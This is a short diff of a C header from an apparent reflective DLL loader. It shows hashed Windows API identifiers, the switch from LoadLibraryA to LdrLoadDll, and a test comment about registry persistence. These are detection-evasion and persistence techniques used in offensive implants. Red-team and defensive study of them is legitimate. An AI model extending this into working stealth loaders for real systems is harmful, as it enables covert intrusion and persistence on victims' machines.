@@ -12,8 +12,7 @@
 --------------------------*/
 #define K32 0xFD2AD9BD    // KERNEL32.DLL
 #define NTLIB 0x635A68AA  // ntdll.dll 
-#define GP 0xAED18BA0     // GetProcAddress
-#define LLB 0x54C1D227    // LoadLibraryA
+#define LLB 0xA22CF128    // LdrLoadDll
 #define FLS 0x3D98C2A1    // NtFlushInstructionCache
 #define NTVA 0x6E8AC28E   // NtAllocateVirtualMemory
 #define NTVP 0x1DA5BB2B   // NtProtectVirtualMemory
@@ -30,7 +29,8 @@ extern "C" LPVOID KaynCaller();
     Helper functions for API resolving
 ---------------------------------------*/
 HMODULE GetHand(UINT32 hashLib);
-FARPROC GetAddr(HMODULE hModule, UINT32 ApiHash);
+FARPROC GetAddr(HMODULE hModule, UINT32 ApiHash, PWINAPIS pWinAPIs);
+HMODULE Loader(LPSTR dllName, PWINAPIS pWinAPIs);
 void MemCpy(LPVOID dst, LPVOID src, size_t size);
 UINT32 HashA(PCHAR String, SIZE_T Length);
 
@@ -62,7 +62,7 @@ void Runner();
 
 
 /*-----------------------------------------
-    Simple test for the reflective loader
+    Simple test for the reflective DLL
     Registry modification for persistence
 -----------------------------------------*/
 #define ADV32 0x07862FA5    // advapi32.dll
